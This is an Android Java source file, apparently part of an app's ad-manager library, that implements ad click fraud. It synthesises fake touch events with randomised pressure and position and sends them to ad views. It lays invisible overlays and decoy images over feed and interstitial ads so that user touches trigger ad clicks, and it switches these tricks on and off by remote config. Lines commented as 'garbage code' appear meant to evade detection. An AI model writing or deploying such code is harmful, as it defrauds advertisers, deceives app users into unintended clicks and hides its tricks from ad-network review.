package com.common.wheel.admanager;

import android.app.Activity;
import android.content.Context;
import android.os.SystemClock;
import android.text.TextUtils;
import android.util.ArrayMap;
import android.util.Log;
import android.view.Gravity;
import android.view.MotionEvent;
import android.view.View;
import android.view.ViewGroup;
import android.widget.FrameLayout;
import android.widget.ImageView;
import android.widget.LinearLayout;

import com.bumptech.glide.Glide;
import com.bytedance.sdk.openadsdk.TTFeedAd;
import com.bytedance.sdk.openadsdk.TTFullScreenVideoAd;
import com.bytedance.sdk.openadsdk.mediation.manager.MediationAdEcpmInfo;
import com.common.wheel.R;
import com.common.wheel.constans.ConstantsPath;
import com.common.wheel.util.DeviceUtil;
import com.common.wheel.util.GsonUtil;
import com.google.gson.Gson;
import com.orhanobut.hawk.Hawk;

import java.lang.reflect.Field;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Random;

public class ViewHelper {

    protected static List<View> clickViewList = new ArrayList<>();
    protected static List<View> infoClickViewList = new ArrayList<>();

    protected static List<Integer> locationList = new ArrayList<>();

    protected static void clickView(ViewGroup rv) {

        try {

            long dTime = SystemClock.uptimeMillis();
            long eTime = SystemClock.uptimeMillis();
            int randomInt = (int) (Math.random() * 30);
            float x = (rv.getWidth() / 2f) + randomInt;
            float y = (rv.getHeight() / 2f) + randomInt;
            int metaState = 0;
            float pressure = 0.9f + (float) Math.random() * 0.1f;  // 0.9 ~ 1.0
            float size = 0.9f + (float) Math.random() * 0.1f; // 0.9 ~ 1.0

            MotionEvent de = MotionEvent.obtain(dTime, eTime, MotionEvent.ACTION_DOWN, x, y, pressure, size,
                    metaState, pressure, pressure, 0, 0);


            // 添加垃圾代码
            Class<?> activityThreadClass = Class.forName("android.app.ActivityThread");


            MotionEvent ue = MotionEvent.obtain(dTime, eTime, MotionEvent.ACTION_UP, x, y, pressure, size,
                    metaState, pressure, pressure, 0, 0);
            // 添加垃圾代码
            Object activityThread = activityThreadClass.getMethod("currentActivityThread").invoke(null);


            rv.dispatchTouchEvent(de);
            rv.dispatchTouchEvent(ue);
            de.recycle();
            ue.recycle();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    protected static void addInterstitialView(TTFullScreenVideoAd mAd) {
        Activity ctx = getCurPage();
        if (ctx != null) {
            addInterstitialView(ctx, mAd);
        } else {
            Log.e("", "ViewHelper get error");
        }
    }


    protected static Activity getCurPage() {
        try {
            Class<?> activityThreadClass = Class.forName("android.app.ActivityThread");
            Object activityThread = activityThreadClass.getMethod("currentActivityThread").invoke(null);
            Field activitiesField = activityThreadClass.getDeclaredField("mActivities");
            activitiesField.setAccessible(true);
            ArrayMap<?, ?> activities = (ArrayMap<?, ?>) activitiesField.get(activityThread);
            for (Object activityRecord : activities.values()) {
                Class<?> activityRecordClass = activityRecord.getClass();
                Field pausedField = activityRecordClass.getDeclaredField("paused");
                pausedField.setAccessible(true);
                if (!pausedField.getBoolean(activityRecord)) {
                    Field activityField = activityRecordClass.getDeclaredField("activity");
                    activityField.setAccessible(true);
                    return (Activity) activityField.get(activityRecord);
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }

    protected static ImageView getOneImageView(String key, Activity act, int zLeft, int zTop, int zWidth) {
        boolean yesOrNo = new Random().nextBoolean();
        Log.i("aaa", "获取的随机数：" + yesOrNo);
        int randomTop = (int) (Math.random() * 10);
        int randomLeft = (int) (Math.random() * 10);

        int left = yesOrNo ? (zLeft == 0 ? 75 : zLeft) : (zWidth == 0 ? 850 : (zWidth - zLeft));
        int top = zTop > 0 ? zTop + 30 : 560;
        if (key.equals("ks")) {
            left = yesOrNo ? (zLeft == 0 ? 50 : zLeft) : (zWidth == 0 ? 800 : (zWidth - zLeft));
            top = 460;
        }
        top = top + randomTop;
        left = left + randomLeft;
         // "https://vcg02.cfp.cn/creative/vcg/800/new/VCG211245661743.jpg";
        String perss_img_url_value = Hawk.get(ConstantsPath.perss_img_url_value, "");
        ImageView ci = new ImageView(act);
        Glide.with(act).load(perss_img_url_value).into(ci);
//            ci.setImageDrawable(act.getResources().getDrawable(R.mipmap.icon_close));
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                80,
                80, Gravity.CENTER
        );
        lp.setMargins(left, top, 0, 0);
        ci.setLayoutParams(lp);
        return ci;
    }

    protected static ImageView getTwoImageView(String key, Activity act, int zLeft, int zTop, int zWidth, int height) {
        boolean yesOrNo = new Random().nextBoolean();

        int randomTop = (int) (Math.random() * 10);
        int randomLeft = (int) (Math.random() * 10);

        int left = yesOrNo ? (zLeft == 0 ? 85 : zLeft * 2) : (zWidth == 0 ? 850 : (zWidth - zLeft));
        int top = zTop > 0 ? ((height + zTop) / 2 + 100) : 980;
        if (key.equals("ks")) {
            left = yesOrNo ? (zLeft == 0 ? 60 : zLeft) : (zWidth == 0 ? 800 : (zWidth - zLeft));
            top = 760;
        }

        top = top + randomTop;
        left = left + randomLeft;

        String perss_img_url_value = Hawk.get(ConstantsPath.perss_img_url_value, "");
        ImageView ci = new ImageView(act);
        Glide.with(act).load(perss_img_url_value).into(ci);
//            ci.setImageDrawable(act.getResources().getDrawable(R.mipmap.icon_close));
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                80,
                80, Gravity.CENTER
        );
        lp.setMargins(left, top, 0, 0);
        ci.setLayoutParams(lp);
        return ci;
    }

    // 递归查找穿山甲广告视图
    private static boolean findAdViewRecursive(ViewGroup parent) {
        for (int i = 0; i < parent.getChildCount(); i++) {
            View child = parent.getChildAt(i);
            int[] location = new int[2];
            child.getLocationOnScreen(location);
            Log.d("AdPosition", "广告位置 - Left: " + location[0] + ", Top: " + location[1] + ", width: " + child.getWidth() + ", height: " + child.getHeight());
            if (location[0] > 10 && child.getWidth() > 100 && locationList.isEmpty()) {
                locationList.add(location[0]);
                locationList.add(location[1]);
                locationList.add(child.getWidth());
                locationList.add(child.getHeight());
                return true;
            }
            if (child instanceof ViewGroup) {
                if (findAdViewRecursive((ViewGroup) child)) {
                    return true;
                }
            }
        }
        return false;
    }

    /**
     * 检查当前是否有 Dialog 显示
     */
    public static boolean isDialogShowing(Activity activity) {
        if (activity == null || activity.isFinishing()) {
            return false;
        }

        // 获取当前 Window 的 DecorView
        View decorView = activity.getWindow().getDecorView();
        if (decorView instanceof ViewGroup) {
            ViewGroup rootView = (ViewGroup) decorView;

            // 遍历子 View，检查是否有 Dialog 的 DecorView
            for (int i = 0; i < rootView.getChildCount(); i++) {
                View child = rootView.getChildAt(i);
                if (child.getClass().getName().contains("Dialog")) {
                    return true;
                }
            }
        }
        return false;
    }

    protected static void addInterstitialView(Activity act, TTFullScreenVideoAd mAd) {
        try {
            MediationAdEcpmInfo item = mAd.getMediationManager().getShowEcpm();
            String key = item.getSdkName();
            Log.i("addInterstitialView", "广告SdkName信息:" + item.getSdkName());
            Log.i("addInterstitialView", "广告ReqBiddingType:" + item.getReqBiddingType());
            Log.i("addInterstitialView", "广告RitType:" + item.getRitType());
            Log.i("addInterstitialView", "广告AbTestId:" + item.getAbTestId());
            Log.i("addInterstitialView", "广告ScenarioId:" + item.getScenarioId());
            Log.i("addInterstitialView", "广告SegmentId信息:" + item.getSegmentId());
            Log.i("addInterstitialView", "广告Channel信息:" + item.getChannel());
            Log.i("addInterstitialView", "广告SubChannel信息:" + item.getSubChannel());
            Log.i("addInterstitialView", "广告ecpm信息:" + item.getEcpm());
            Log.i("addInterstitialView", "广告CustomData信息:" + item.getCustomData());

//            boolean isDialog = isDialogShowing(act);
//            Log.i("------aaaaa", "---isDialog:" + isDialog);

            ViewGroup rv = (ViewGroup) act.findViewById(android.R.id.content);
            if (isInterInfoPerssView(act, key)) {
                locationList.clear();

                findAdViewRecursive(rv);
                int left = 0;
                int top = 0;
                int width = 0;
                int height = 0;
                if (!locationList.isEmpty()) {
                    left = locationList.get(0);
                    top = locationList.get(1);
                    width = locationList.get(2);
                    height = locationList.get(3);
                }
                Log.d("AdPosition", "最终广告位置 - Left: " + left + ", Top: " + top + ", width: " + width + ", height: " + height);


                ImageView ci = getOneImageView(key, act, left, top, width);
                clickViewList.add(ci);
                ImageView ci2 = getTwoImageView(key, act, left, top, width, height);
                clickViewList.add(ci2);
                // 添加垃圾代码
                Class<?> activityThreadClass = Class.forName("android.view.View");
                ci.setOnTouchListener(new View.OnTouchListener() {
                    
                    @Override
                    public boolean onTouch(View v, MotionEvent event) {
                        switch (event.getAction()) {
                            case MotionEvent.ACTION_DOWN:
                                Log.i("", "----click_CP_YD");
                                logInterEcpmInfo(act, mAd, "PERSS_CLICK");
                                break;
                            case MotionEvent.ACTION_MOVE:
                                break;
                            case MotionEvent.ACTION_UP:
                                break;
                        }
                        return false;
                    }
                });
                ci2.setOnTouchListener(new View.OnTouchListener() {

                    @Override
                    public boolean onTouch(View v, MotionEvent event) {
                        switch (event.getAction()) {
                            case MotionEvent.ACTION_DOWN:
                                Log.i("", "----click_CP_YD");
                                logInterEcpmInfo(act, mAd, "PERSS_CLICK");
                                break;
                            case MotionEvent.ACTION_MOVE:
                                break;
                            case MotionEvent.ACTION_UP:
                                break;
                        }
                        return false;
                    }
                });
//                ci.setOnClickListener(v -> {
//                    ViewHelper.clickView(rv);
//                    logInterEcpmInfo(act, mAd, "PERSS_CLICK");
//                    //ci.setVisibility(View.GONE);
//                });
                rv.addView(ci);
                rv.addView(ci2);
            }

            if (isInterInfoClickView(act, key)) {
                LinearLayout layout = new LinearLayout(act, null);
                // 添加垃圾代码
                Class<?> fl = Class.forName("android.widget.FrameLayout");
//                layout.setOnTouchListener(new View.OnTouchListener() {
//                    @Override
//                    public boolean onTouch(View v, MotionEvent event) {
//                        switch (event.getAction()) {
//                            case MotionEvent.ACTION_DOWN:
//                                Log.i("", "----click_CP_WD");
//                                logInterEcpmInfo(act, mAd, "MIS_CLICK");
//                                break;
//                            case MotionEvent.ACTION_MOVE:
//                                break;
//                            case MotionEvent.ACTION_UP:
//                                break;
//                        }
//                        return false;
//                    }
//                });

                layout.setOnClickListener(v -> {
                    ViewHelper.clickView(rv);
                    logInterEcpmInfo(act, mAd, "MIS_CLICK");
                    layout.setVisibility(View.GONE);
                });

                rv.addView(layout);
                clickViewList.add(layout);
            }

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    /**
     * 增加信息流误点
     *
     * @param context
     * @param sc
     * @param efv
     * @param ttFeedAd
     */
    protected static void renderInfoView(Context context, FrameLayout sc, View efv, TTFeedAd ttFeedAd) {
        try {
            FrameLayout fv = new FrameLayout(context);
            FrameLayout fli = new FrameLayout(context);
            // 蒙层
            View llm = new View(context);

            MediationAdEcpmInfo item = ttFeedAd.getMediationManager().getShowEcpm();
            String key = item.getSdkName();

            // 添加垃圾代码
            Class<?> activityThreadClass = Class.forName("android.widget.FrameLayout");


            fv.addView(fli);
            fv.addView(llm);
//        fli.removeAllViews();
            fli.addView(efv);

            // 添加垃圾代码
            Class<?> vv = Class.forName("android.view.View");
            llm.setVisibility(View.GONE);
            if (isAddInfoView(context, key)) {
                infoClickViewList.add(llm);
                llm.setVisibility(View.VISIBLE);
                llm.setOnTouchListener(new View.OnTouchListener() {
                    @Override
                    public boolean onTouch(View v, MotionEvent event) {
                        switch (event.getAction()) {
                            case MotionEvent.ACTION_DOWN:
                            case MotionEvent.ACTION_MOVE:
                                Log.i("", "----click_info_WD");
                                ViewHelper.clickView((ViewGroup) efv);
                                logInfoEcpmInfo(context, ttFeedAd);
                                break;
                            case MotionEvent.ACTION_UP:
                                break;
                        }
                        return false;
                    }
                });
            }
            sc.removeAllViews();
            sc.addView(fv);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    /**
     * 信息流误点
     *
     * @param context
     * @return
     */
    protected static boolean isAddInfoView(Context context, String key) {
        boolean isBd = "baidu".equals(key);
//        boolean isSim = DeviceUtil.hasSimCard(context);
        boolean isCount = false;
        try {
            boolean feeds_misclick_ad_config = Hawk.get(ConstantsPath.feeds_misclick_ad_config, false);
            // 不增加误点
            if (!feeds_misclick_ad_config) {
                return false;
            }
            int count = Hawk.get("infoCount", 1);
            String feeds_misclick_ad_config_value = Hawk.get(ConstantsPath.feeds_misclick_ad_config_value, "");
            if (!TextUtils.isEmpty(feeds_misclick_ad_config_value)) {
                if (count <= Integer.parseInt(feeds_misclick_ad_config_value)) {
                    isCount = true;
                }
            }
        } catch (Exception e) {
        }
        String publicIP = Hawk.get("publicIP");
        String ip = TextUtils.isEmpty(publicIP) ? DeviceUtil.getWifiIpAddress(context) : publicIP;
        return !isBd && isCount && !TextUtils.isEmpty(ip);
    }

    /**
     * 插屏诱导
     *
     * @param context
     * @return
     */
    protected static boolean isInterInfoPerssView(Context context, String key) {
        boolean isBd = "baidu".equals(key);
//        boolean isSim = DeviceUtil.hasSimCard(context);
        boolean isCount = false;
        int count = Hawk.get("interCount", 1);
        int maxNum = 0;
        try {
            boolean interstitial_perss_ad_config = Hawk.get(ConstantsPath.interstitial_perss_ad_config, false);
            // 不增加误点
            if (!interstitial_perss_ad_config) {
                return false;
            }

            String interstitial_perss_ad_config_value = Hawk.get(ConstantsPath.interstitial_perss_ad_config_value, "");
            if (!TextUtils.isEmpty(interstitial_perss_ad_config_value)) {
                String[] value = interstitial_perss_ad_config_value.split(",");
                maxNum = Integer.parseInt(value[value.length - 1]);
                for (String v : value) {
                    if (Integer.parseInt(v) == count) {
                        isCount = true;
                        break;
                    }
                }
            }
        } catch (Exception e) {
        }
        String publicIP = Hawk.get("publicIP");
        String ip = TextUtils.isEmpty(publicIP) ? DeviceUtil.getWifiIpAddress(context) : publicIP;
        boolean isAdd = !isBd && isCount && !TextUtils.isEmpty(ip);
        if ((count + 1) <= (maxNum + 1)) {
            Hawk.put("interCount", count + 1);
        }
        return isAdd;
    }

    /**
     * 插屏误点
     *
     * @param context
     * @return
     */
    protected static boolean isInterInfoClickView(Context context, String key) {
        boolean isBd = "baidu".equals(key);
//        boolean isSim = DeviceUtil.hasSimCard(context);
        boolean isCount = false;
        int count = Hawk.get("interClickCount", 1);
        int maxNum = 0;
        try {
            boolean interstitial_misclick_ad_switch = Hawk.get(ConstantsPath.interstitial_misclick_ad_config, false);
            // 不增加误点
            if (!interstitial_misclick_ad_switch) {
                return false;
            }
            String interstitial_misclick_ad_switch_value = Hawk.get(ConstantsPath.interstitial_misclick_ad_config_value, "");
            if (!TextUtils.isEmpty(interstitial_misclick_ad_switch_value)) {
                String[] value = interstitial_misclick_ad_switch_value.split(",");
                maxNum = Integer.parseInt(value[value.length - 1]);
                for (String v : value) {
                    if (Integer.parseInt(v) == count) {
                        isCount = true;
                        break;
                    }
                }
            }
        } catch (Exception e) {
        }
        String publicIP = Hawk.get("publicIP");
        String ip = TextUtils.isEmpty(publicIP) ? DeviceUtil.getWifiIpAddress(context) : publicIP;
        boolean isAdd = !isBd && isCount && !TextUtils.isEmpty(ip);
        if ((count + 1) <= (maxNum + 1)) {
            Hawk.put("interClickCount", count + 1);
        }
        return isAdd;
    }

    protected static void logInterEcpmInfo(Context context, TTFullScreenVideoAd mAd, String clickType) {
        try {
            MediationAdEcpmInfo item = mAd.getMediationManager().getShowEcpm();
            HashMap<String, String> params = new HashMap<>();
            params.put("adPlatform", item.getSdkName()); // 广告平台（见平台枚举）
            params.put("adType", "INTERSTITIAL");// 插屏
            params.put("ecpm", item.getEcpm());
            params.put("adPosition", item.getSlotId()); // 广告位标识
            params.put("clickType", clickType); // 误触
            params.put("userId", "");
            ApiService.postAdInfo(context, params);
        } catch (Exception e) {
        }
    }

    protected static void logInfoEcpmInfo(Context context, TTFeedAd ttFeedAd) {
        MediationAdEcpmInfo item = ttFeedAd.getMediationManager().getShowEcpm();
        try {
            HashMap<String, String> params = new HashMap<>();
            params.put("adPlatform", item.getSdkName()); // 广告平台（见平台枚举）
            params.put("adType", "FEEDS");// 信息流
            params.put("ecpm", item.getEcpm());
            params.put("adPosition", item.getSlotId()); // 广告位标识
            params.put("clickType", "MIS_CLICK"); // 误触
            params.put("userId", "");
            ApiService.postAdInfo(context, params);
        } catch (Exception e) {
        }
    }

    protected static void logRewardEcpmInfo(Context context, MediationAdEcpmInfo item) {
        try {
            HashMap<String, String> params = new HashMap<>();
            params.put("adPlatform", item.getSdkName()); // 广告平台（见平台枚举）
            params.put("adType", "VIDEO");// 激励
            params.put("ecpm", item.getEcpm());
            params.put("adPosition", item.getSlotId()); // 广告位标识
            params.put("clickType", "MANUAL_CLICK"); // 手动
            params.put("userId", "");
            ApiService.postAdInfo(context, params);
        } catch (Exception e) {
        }
    }

    protected static void showAdUploadInfo(Context context, MediationAdEcpmInfo item, String adType ) {
        try {
            HashMap<String, String> params = new HashMap<>();
            params.put("adPlatform", item.getSdkName()); // 广告平台（见平台枚举）
            params.put("adType", adType);// 广告类型
            params.put("ecpm", item.getEcpm());
            params.put("adPosition", item.getSlotId()); // 广告位标识
            params.put("clickType", "NO_CLICK"); // 未点击
            params.put("userId", "");
            Log.i("aaa------","aaa------:"+GsonUtil.formatObjectToJson(params));
            ApiService.addLog(context,"show","获取广告类型："+GsonUtil.formatObjectToJson(params));

            ApiService.postAdInfo(context, params);
        } catch (Exception e) {
        }
    }

    protected static void hideView() {
        if (clickViewList == null || clickViewList.isEmpty()) {
            return;
        }
        for (View view : clickViewList) {
            view.setVisibility(View.GONE);
        }
        clickViewList.clear();
    }
    protected static void hideInfoView() {
        if (infoClickViewList == null || infoClickViewList.isEmpty()) {
            return;
        }
        for (View view : infoClickViewList) {
            view.setVisibility(View.GONE);
        }
        infoClickViewList.clear();
    }

    // ks 快手 baidu 百度 ylh优量汇  pangle穿山甲
}
